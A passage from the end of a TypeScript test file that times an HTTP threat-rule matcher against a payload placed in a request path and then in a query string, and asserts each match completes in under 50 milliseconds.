            const pathText: HttpThreatRequestText = buildText({ path: payload });
            const pathStartedAt: number = performance.now();
            HttpThreatRules.match(pathText, CONTEXT);
            const pathDuration: number = performance.now() - pathStartedAt;

            expect(pathDuration).toBeLessThan(50);

            const queryText: HttpThreatRequestText = buildText({ query: payload });
            const queryStartedAt: number = performance.now();
            HttpThreatRules.match(queryText, CONTEXT);
            const queryDuration: number = performance.now() - queryStartedAt;

            expect(queryDuration).toBeLessThan(50);
        });
    });
});
